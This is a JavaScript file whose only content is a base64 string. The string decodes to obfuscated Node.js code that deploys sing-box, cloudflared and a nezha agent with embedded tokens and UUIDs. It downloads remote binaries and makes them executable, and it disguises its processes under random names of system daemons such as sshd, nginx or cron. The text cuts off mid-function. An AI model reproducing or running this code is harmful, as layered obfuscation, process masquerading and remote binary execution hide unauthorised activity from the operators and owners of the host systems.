const b = 'Y29uc3QgXzB4MWE5MWE3PV8weDVhNzg7KGZ1bmN0aW9uKF8weDI0ZTIzZSxfMHgyMjgxMTQpe2NvbnN0IF8weDU5ZmIwYz1fMHg1YTc4LF8weGVmMmRjMj1fMHgyNGUyM2UoKTt3aGlsZSghIVtdKXt0cnl7Y29uc3QgXzB4MjI0Mzc4PXBhcnNlSW50KF8weDU5ZmIwYygweDEyNCkpLzB4MSoocGFyc2VJbnQoXzB4NTlmYjBjKDB4MTIzKSkvMHgyKSstcGFyc2VJbnQoXzB4NTlmYjBjKDB4MTIwKSkvMHgzKihwYXJzZUludChfMHg1OWZiMGMoMHgxNDgpKS8weDQpKy1wYXJzZUludChfMHg1OWZiMGMoMHgxYmMpKS8weDUrcGFyc2VJbnQoXzB4NTlmYjBjKDB4MTJiKSkvMHg2K3BhcnNlSW50KF8weDU5ZmIwYygweDFjNykpLzB4NystcGFyc2VJbnQoXzB4NTlmYjBjKDB4MTQzKSkvMHg4K3BhcnNlSW50KF8weDU5ZmIwYygweDFhYSkpLzB4OTtpZihfMHgyMjQzNzg9PT1fMHgyMjgxMTQpYnJlYWs7ZWxzZSBfMHhlZjJkYzJbJ3B1c2gnXShfMHhlZjJkYzJbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDU5OTAwNil7XzB4ZWYyZGMyWydwdXNoJ10oXzB4ZWYyZGMyWydzaGlmdCddKCkpO319fShfMHg1YjZjLDB4Yjg2YzkpKTtjb25zdCBodHRwPXJlcXVpcmUoXzB4MWE5MWE3KDB4MTZjKSksaHR0cHM9cmVxdWlyZShfMHgxYTkxYTcoMHgxYjgpKSxmcz1yZXF1aXJlKCdmcycpLHBhdGg9cmVxdWlyZSgncGF0aCcpLG9zPXJlcXVpcmUoJ29zJykse3NwYXduLGV4ZWN9PXJlcXVpcmUoXzB4MWE5MWE3KDB4MTk3KSkse1VSTH09cmVxdWlyZShfMHgxYTkxYTcoMHgxNjcpKSxjcnlwdG89cmVxdWlyZShfMHgxYTkxYTcoMHgxZTApKSxuZXQ9cmVxdWlyZShfMHgxYTkxYTcoMHgxNjApKSxleHByZXNzPXJlcXVpcmUoJ2V4cHJlc3MnKSx7Y3JlYXRlUHJveHlNaWRkbGV3YXJlfT1yZXF1aXJlKCdodHRwLXByb3h5LW1pZGRsZXdhcmUnKSxheGlvcz1yZXF1aXJlKF8weDFhOTFhNygweDFhNykpLENPTkZJRz17J0NfVCc6cHJvY2Vzc1tfMHgxYTkxYTcoMHgxOWYpXVtfMHgxYTkxYTcoMHgxNTIpXXx8XzB4MWE5MWE3KDB4MWFjKSwnQl9EJzpwcm9jZXNzW18weDFhOTFhNygweDE5ZildW18weDFhOTFhNygweDEyZildfHxfMHgxYTkxYTcoMHgxNTYpLCdDX0QnOnByb2Nlc3NbXzB4MWE5MWE3KDB4MTlmKV1bXzB4MWE5MWE3KDB4MWQxKV18fF8weDFhOTFhNygweDE4ZSksJ05fUyc6cHJvY2Vzc1tfMHgxYTkxYTcoMHgxOWYpXVtfMHgxYTkxYTcoMHgxNzkpXXx8XzB4MWE5MWE3KDB4MTMzKSwnTl9QJzpwcm9jZXNzW18weDFhOTFhNygweDE5ZildW18weDFhOTFhNygweDE1MyldfHwnNDQzJywnTl9LJzpwcm9jZXNzWydlbnYnXVtfMHgxYTkxYTcoMHgxODgpXXx8XzB4MWE5MWE3KDB4MTU0KSwnTl9UJzpwcm9jZXNzWydlbnYnXVtfMHgxYTkxYTcoMHgxNzYpXXx8XzB4MWE5MWE3KDB4MTkwKSwnSFkyX1BPUlQnOnByb2Nlc3NbJ2VudiddW18weDFhOTFhNygweDFhNSldfHxwcm9jZXNzWydlbnYnXVsnU0VSVkVSX1BPUlQnXXx8JycsJ1ZNRVNTX1BPUlQnOnByb2Nlc3NbXzB4MWE5MWE3KDB4MTlmKV1bXzB4MWE5MWE3KDB4MTY2KV18fF8weDFhOTFhNygweDE3YSksJ1JFQUxJVFlfUE9SVCc6cHJvY2Vzc1tfMHgxYTkxYTcoMHgxOWYpXVtfMHgxYTkxYTcoMHgxYzYpXXx8JycsJ1RVSUNfUE9SVCc6cHJvY2Vzc1tfMHgxYTkxYTcoMHgxOWYpXVsnVFVJQ19QT1JUJ118fCcnLCdTRVJWRVJfSVAnOnByb2Nlc3NbXzB4MWE5MWE3KDB4MTlmKV1bJ1NFUlZFUl9JUCddfHwnJywnVk1FU1NfVVVJRCc6cHJvY2Vzc1tfMHgxYTkxYTcoMHgxOWYpXVsnVk1FU1NfVVVJRCddfHwnZmVlZmViOTYtYmZjZi00YTliLWFhYzAtNmFhYzc3MWMxYjk4JywnVFVJQ19VVUlEJzpwcm9jZXNzW18weDFhOTFhNygweDE5ZildWydUVUlDX1VVSUQnXXx8J2ZlZWZlYjk2LWJmY2YtNGE5Yi1hYWMwLTZhYWM3NzFjMWI5OCcsJ1RVSUNfUEFTU1dPUkQnOnByb2Nlc3NbXzB4MWE5MWE3KDB4MTlmKV1bJ1RVSUNfUEFTU1dPUkQnXXx8XzB4MWE5MWE3KDB4MWE0KSwnSFkyX1BBU1NXT1JEJzpwcm9jZXNzW18weDFhOTFhNygweDE5ZildW18weDFhOTFhNygweDFlMSldfHxfMHgxYTkxYTcoMHgxYTQpLCdSRUFMSVRZX1BSSVZBVEVfS0VZJzpwcm9jZXNzWydlbnYnXVsnUkVBTElUWV9QUklWQVRFX0tFWSddfHwnJywnUkVBTElUWV9QVUJMSUNfS0VZJzpwcm9jZXNzW18weDFhOTFhNygweDE5ZildWydSRUFMSVRZX1BVQkxJQ19LRVknXXx8JycsJ0hZMl9TTkknOnByb2Nlc3NbJ2VudiddW18weDFhOTFhNygweDFkMCldfHxfMHgxYTkxYTcoMHgxNTApLCdWTUVTU19QQVRIJzpwcm9jZXNzWydlbnYnXVsnVk1FU1NfUEFUSCddfHwnL3ZtcycsJ1JFQUxJVFlfU05JJzpwcm9jZXNzW18weDFhOTFhNygweDE5ZildW18weDFhOTFhNygweDE0YSldfHwnd3d3Lm1pY3Jvc29mdC5jb20nLCdSRUFMSVRZX1NIT1JUX0lEJzpwcm9jZXNzWydlbnYnXVtfMHgxYTkxYTcoMHgxZTgpXXx8JzAxMjM0NTY3ODlhYmNkZWYnLCdQT1JUJzpwcm9jZXNzW18weDFhOTFhNygweDE5ZildW18weDFhOTFhNygweDFjYyldfHwweDFlYjR9LFdPUktfRElSPW9zWyd0bXBkaXInXSgpLHByb2Nlc3Nlcz1bXTtsZXQgc2VydmljZVN0YXR1cz17J3Npbmdib3gnOl8weDFhOTFhNygweDFjMSksJ2Nsb3VkZmxhcmVkJzpfMHgxYTkxYTcoMHgxYzEpLCduZXpoYSc6XzB4MWE5MWE3KDB4MWMxKSwnaHR0cCc6XzB4MWE5MWE3KDB4MWMxKX07Y29uc3QgSFRNTF9URU1QTEFURVM9eydob21lJzpfMHgxYTkxYTcoMHgxYmUpLCdzdGF0dXMnOihfMHhkMjAzMzMsXzB4MTYyN2ZlKT0+J1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxodG1sPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxoZWFkPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8dGl0bGU+U2VydmljZVx4MjBTdGF0dXM8L3RpdGxlPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8bWV0YVx4MjBjaGFyc2V0PVx4MjJVVEYtOFx4MjI+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxtZXRhXHgyMG5hbWU9XHgyMnZpZXdwb3J0XHgyMlx4MjBjb250ZW50PVx4MjJ3aWR0aD1kZXZpY2Utd2lkdGgsXHgyMGluaXRpYWwtc2NhbGU9MS4wXHgyMj5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPHN0eWxlPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwYm9keXtmb250LWZhbWlseTpBcmlhbCxzYW5zLXNlcmlmO21hcmdpbjo0MHB4O2JhY2tncm91bmQtY29sb3I6I2Y1ZjVmNX1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5jb250YWluZXJ7bWF4LXdpZHRoOjkwMHB4O21hcmdpbjowXHgyMGF1dG87YmFja2dyb3VuZDp3aGl0ZTtwYWRkaW5nOjMwcHg7Ym9yZGVyLXJhZGl1czo4cHg7Ym94LXNoYWRvdzowXHgyMDJweFx4MjAxMHB4XHgyMHJnYmEoMCwwLDAsMC4xKX1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGgxe2NvbG9yOiMzMzM7dGV4dC1hbGlnbjpjZW50ZXI7bWFyZ2luLWJvdHRvbTozMHB4fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLnN0YXR1cy1ncmlke2Rpc3BsYXk6Z3JpZDtncmlkLXRlbXBsYXRlLWNvbHVtbnM6cmVwZWF0KGF1dG8tZml0LG1pbm1heCgyMDBweCwxZnIpKTtnYXA6MjBweDttYXJnaW4tYm90dG9tOjMwcHh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAuc3RhdHVzLWNhcmR7cGFkZGluZzoyMHB4O2JhY2tncm91bmQ6I2Y4ZjlmYTtib3JkZXItcmFkaXVzOjhweDt0ZXh0LWFsaWduOmNlbnRlcn1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5zdGF0dXMtY2FyZFx4MjBoM3ttYXJnaW46MFx4MjAwXHgyMDEwcHhceDIwMDtjb2xvcjojNTU1fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLnN0YXR1cy1ydW5uaW5ne2JhY2tncm91bmQ6I2Q0ZWRkYTtjb2xvcjojMTU1NzI0fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLnN0YXR1cy1zdG9wcGVke2JhY2tncm91bmQ6I2Y4ZDdkYTtjb2xvcjojNzIxYzI0fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLmluZm8taXRlbXttYXJnaW46MjBweFx4MjAwO3BhZGRpbmc6MTVweDtiYWNrZ3JvdW5kOiNmOGY5ZmE7Ym9yZGVyLXJhZGl1czo1cHh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAubGFiZWx7Zm9udC13ZWlnaHQ6Ym9sZDtjb2xvcjojNTU1O21hcmdpbi1ib3R0b206MTBweH1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC52YWx1ZXtmb250LWZhbWlseTptb25vc3BhY2U7YmFja2dyb3VuZDojZTllY2VmO3BhZGRpbmc6MTBweDtib3JkZXItcmFkaXVzOjRweDt3b3JkLWJyZWFrOmJyZWFrLWFsbDtmb250LXNpemU6MTJweH1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5jb3B5LWJ0bntiYWNrZ3JvdW5kOiMwMDdjYmE7Y29sb3I6d2hpdGU7Ym9yZGVyOm5vbmU7cGFkZGluZzo4cHhceDIwMTVweDtib3JkZXItcmFkaXVzOjNweDtjdXJzb3I6cG9pbnRlcjttYXJnaW4tdG9wOjEwcHh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAuY29weS1idG46aG92ZXJ7YmFja2dyb3VuZDojMDA1NmIzfVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLnByb3RvY29se2NvbG9yOiMyOGE3NDU7Zm9udC13ZWlnaHQ6Ym9sZH1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5uYXZ7dGV4dC1hbGlnbjpjZW50ZXI7bWFyZ2luLWJvdHRvbToyMHB4fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLm5hdlx4MjBhe21hcmdpbjowXHgyMDEwcHg7Y29sb3I6IzAwN2NiYTt0ZXh0LWRlY29yYXRpb246bm9uZX1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5uYXZceDIwYTpob3Zlcnt0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lfVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLnBvcnQtaW5mb3ttYXJnaW46MjBweFx4MjAwO3BhZGRpbmc6MTVweDtiYWNrZ3JvdW5kOiNlOWVjZWY7Ym9yZGVyLXJhZGl1czo1cHh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAucG9ydC1ncmlke2Rpc3BsYXk6Z3JpZDtncmlkLXRlbXBsYXRlLWNvbHVtbnM6cmVwZWF0KGF1dG8tZml0LG1pbm1heCgxNTBweCwxZnIpKTtnYXA6MTBweDttYXJnaW4tdG9wOjEwcHh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAucG9ydC1pdGVte2JhY2tncm91bmQ6I2ZmZjtwYWRkaW5nOjEwcHg7Ym9yZGVyLXJhZGl1czo0cHg7dGV4dC1hbGlnbjpjZW50ZXI7Ym94LXNoYWRvdzowXHgyMDFweFx4MjAzcHhceDIwcmdiYSgwLDAsMCwwLjEpfVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLnBvcnQtbGFiZWx7Zm9udC13ZWlnaHQ6Ym9sZDtjb2xvcjojNTU1fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLnBvcnQtdmFsdWV7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2NvbG9yOiMyOGE3NDU7bWFyZ2luLXRvcDo1cHh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvc3R5bGU+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxzY3JpcHQ+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBmdW5jdGlvblx4MjByZWZyZXNoUGFnZSgpXHgyMHtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBsb2NhdGlvbi5yZWxvYWQoKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMH1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHNldEludGVydmFsKHJlZnJlc2hQYWdlLFx4MjAzMDAwMCk7XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvc2NyaXB0Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvaGVhZD5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8Ym9keT5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIyY29udGFpbmVyXHgyMj5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxkaXZceDIwY2xhc3M9XHgyMm5hdlx4MjI+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGFceDIwaHJlZj1ceDIyL1x4MjI+SG9tZTwvYT5ceDIwfFx4MjA8YVx4MjBocmVmPVx4MjIvc3RhdHVzXHgyMj5TdGF0dXM8L2E+XHgyMHxceDIwPGFceDIwaHJlZj1ceDIyamF2YXNjcmlwdDpyZWZyZXNoUGFnZSgpXHgyMj5SZWZyZXNoPC9hPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8aDE+U2VydmljZVx4MjBTdGF0dXM8L2gxPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8ZGl2XHgyMGNsYXNzPVx4MjJzdGF0dXMtZ3JpZFx4MjI+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIyc3RhdHVzLWNhcmRceDIwJysoc2VydmljZVN0YXR1c1tfMHgxYTkxYTcoMHgxNGUpXT09PSdydW5uaW5nJz9fMHgxYTkxYTcoMHgxYTgpOl8weDFhOTFhNygweDE3MCkpK18weDFhOTFhNygweDE2OSkrc2VydmljZVN0YXR1c1tfMHgxYTkxYTcoMHgxNGUpXStfMHgxYTkxYTcoMHgxNmYpKyhzZXJ2aWNlU3RhdHVzWydjbG91ZGZsYXJlZCddPT09J3J1bm5pbmcnP18weDFhOTFhNygweDFhOCk6XzB4MWE5MWE3KDB4MTcwKSkrJ1x4MjI+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxoMz5DbG91ZGZsYXJlZDwvaDM+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxkaXY+JytzZXJ2aWNlU3RhdHVzW18weDFhOTFhNygweDEzNyldK18weDFhOTFhNygweDE2ZikrKHNlcnZpY2VTdGF0dXNbJ25lemhhJ109PT1fMHgxYTkxYTcoMHgxZDMpP18weDFhOTFhNygweDFhOCk6XzB4MWE5MWE3KDB4MTcwKSkrXzB4MWE5MWE3KDB4MWExKStzZXJ2aWNlU3RhdHVzW18weDFhOTFhNygweDFjMyldKyc8L2Rpdj5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8L2Rpdj5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8ZGl2XHgyMGNsYXNzPVx4MjJzdGF0dXMtY2FyZFx4MjAnKyhzZXJ2aWNlU3RhdHVzW18weDFhOTFhNygweDE2YyldPT09J3J1bm5pbmcnP18weDFhOTFhNygweDFhOCk6XzB4MWE5MWE3KDB4MTcwKSkrJ1x4MjI+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxoMz5IVFRQXHgyMFNlcnZlcjwvaDM+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxkaXY+JytzZXJ2aWNlU3RhdHVzW18weDFhOTFhNygweDE2YyldK18weDFhOTFhNygweDE5NikrQ09ORklHW18weDFhOTFhNygweDFjYyldK18weDFhOTFhNygweDE0NikrKENPTkZJR1snVk1FU1NfUE9SVCddP18weDFhOTFhNygweDEzNCkrQ09ORklHWydWTUVTU19QT1JUJ10rXzB4MWE5MWE3KDB4MWQ4KTonJykrJ1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAnKyhDT05GSUdbXzB4MWE5MWE3KDB4MWE1KV0/XzB4MWE5MWE3KDB4MTk5KStDT05GSUdbXzB4MWE5MWE3KDB4MWE1KV0rJzwvZGl2PjwvZGl2Pic6JycpKydceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwJysoQ09ORklHWydSRUFMSVRZX1BPUlQnXT9fMHgxYTkxYTcoMHgxZTYpK0NPTkZJR1tfMHgxYTkxYTcoMHgxYzYpXStfMHgxYTkxYTcoMHgxZDgpOicnKStfMHgxYTkxYTcoMHgxMjUpKyhDT05GSUdbXzB4MWE5MWE3KDB4MTdlKV0/XzB4MWE5MWE3KDB4MWU0KStDT05GSUdbJ1RVSUNfUE9SVCddK18weDFhOTFhNygweDFkOCk6JycpK18weDFhOTFhNygweDFjZSkrXzB4ZDIwMzMzKyc8L2Rpdj5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvZGl2Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAnKyhfMHgxNjI3ZmVbXzB4MWE5MWE3KDB4MThhKV0+MHgwP18weDE2MjdmZVtfMHgxYTkxYTcoMHgxZDYpXShfMHg0MGJhZTg9Pl8weDFhOTFhNygweDE2ZSkrXzB4NDBiYWU4W18weDFhOTFhNygweDEzNSldK18weDFhOTFhNygweDE0MCkrXzB4NDBiYWU4W18weDFhOTFhNygweDEzNSldWyd0b0xvd2VyQ2FzZSddKCkrJ1x4MjI+JytfMHg0MGJhZThbXzB4MWE5MWE3KDB4MTY3KV0rXzB4MWE5MWE3KDB4MTU5KStfMHg0MGJhZThbXzB4MWE5MWE3KDB4MTY3KV0rXzB4MWE5MWE3KDB4MWM5KStfMHg0MGJhZThbJ3Byb3RvY29sJ10rXzB4MWE5MWE3KDB4MTU4KSlbXzB4MWE5MWE3KDB4MThiKV0oJycpOl8weDFhOTFhNygweDE4YykpKydceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9ib2R5Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvaHRtbD5ceDBhXHgyMFx4MjBceDIwXHgyMCd9LENPTU1PTl9QUk9DRVNTX05BTUVTPVsnc3NoZCcsJ25naW54JyxfMHgxYTkxYTcoMHgxNGMpLF8weDFhOTFhNygweDE0MSksXzB4MWE5MWE3KDB4MTcyKSwncG9zdGdyZXMnLF8weDFhOTFhNygweDFhZCksXzB4MWE5MWE3KDB4MTk1KSwnbnRwZCcsXzB4MWE5MWE3KDB4MWJiKSwnY3JvbmQnLF8weDFhOTFhNygweDEyYSksXzB4MWE5MWE3KDB4MTNmKSxfMHgxYTkxYTcoMHgxMzgpLF8weDFhOTFhNygweDEyZSksJ3BocC1mcG0nLF8weDFhOTFhNygweDEyOCksXzB4MWE5MWE3KDB4MTM5KSxfMHgxYTkxYTcoMHgxZDQpLF8weDFhOTFhNygweDE2YSksXzB4MWE5MWE3KDB4MTc1KSxfMHgxYTkxYTcoMHgxOTgpLCdsb2dyb3RhdGUnLF8weDFhOTFhNygweDE5MyksXzB4MWE5MWE3KDB4MTIxKSxfMHgxYTkxYTcoMHgxZTMpLCdjcm9uJyxfMHgxYTkxYTcoMHgxODApLCdkaGNsaWVudCcsJ3BvbGtpdGQnLF8weDFhOTFhNygweDE3MSldO2Z1bmN0aW9uIGdldFJhbmRvbVByb2Nlc3NOYW1lKCl7Y29uc3QgXzB4YzUyMGIzPV8weDFhOTFhNztyZXR1cm4gQ09NTU9OX1BST0NFU1NfTkFNRVNbTWF0aFtfMHhjNTIwYjMoMHgxY2EpXShNYXRoWydyYW5kb20nXSgpKkNPTU1PTl9QUk9DRVNTX05BTUVTW18weGM1MjBiMygweDE4YSldKV07fWZ1bmN0aW9uIGRldGVjdEFyY2goKXtjb25zdCBfMHg4OTM1MTE9XzB4MWE5MWE3LF8weGQ0NjU3MT1wcm9jZXNzWydhcmNoJ107cmV0dXJuIF8weGQ0NjU3MT09PV8weDg5MzUxMSgweDEyYyk/J2FtZDY0JzpfMHhkNDY1NzE9PT0nYXJtNjQnP18weDg5MzUxMSgweDEzYyk6KHByb2Nlc3NbJ2V4aXQnXSgweDEpLCcnKTt9YXN5bmMgZnVuY3Rpb24gZG93bmxvYWRCaW5hcnkoXzB4MjVkODMwLF8weDJjZTE0Nyl7Y29uc3QgXzB4NGExZTIzPV8weDFhOTFhNzt0cnl7Y29uc3QgXzB4M2IyZTRhPWF3YWl0IGF4aW9zKHsnbWV0aG9kJzpfMHg0YTFlMjMoMHgxMzApLCd1cmwnOl8weDI1ZDgzMCwncmVzcG9uc2VUeXBlJzpfMHg0YTFlMjMoMHgxNjEpfSksXzB4NTdlMGIwPWZzW18weDRhMWUyMygweDE5MSldKF8weDJjZTE0Nyk7cmV0dXJuIF8weDNiMmU0YVtfMHg0YTFlMjMoMHgxOWQpXVtfMHg0YTFlMjMoMHgxODEpXShfMHg1N2UwYjApLG5ldyBQcm9taXNlKChfMHgzYjEwMWQsXzB4MThmM2QzKT0+e2NvbnN0IF8weDM4MDA2Yz1fMHg0YTFlMjM7XzB4NTdlMGIwWydvbiddKCdmaW5pc2gnLCgpPT57Y29uc3QgXzB4NDEzMTY3PV8weDVhNzg7ZnNbXzB4NDEzMTY3KDB4MWI3KV0oXzB4MmNlMTQ3LDB4MWVkKSxfMHgzYjEwMWQoKTt9KSxfMHg1N2UwYjBbJ29uJ10oXzB4MzgwMDZjKDB4MWJhKSxfMHgxOGYzZDMpO30pO31jYXRjaChfMHg0YjZlOGUpe3Rocm93IF8weDRiNmU4ZTt9fWFzeW5jIGZ1bmN0aW9uIGdldFNlcnZlcklQKCl7Y29uc3QgXzB4MzA5ZDU2PV8weDFhOTFhNzt0cnl7Y29uc3QgXzB4NTViZmY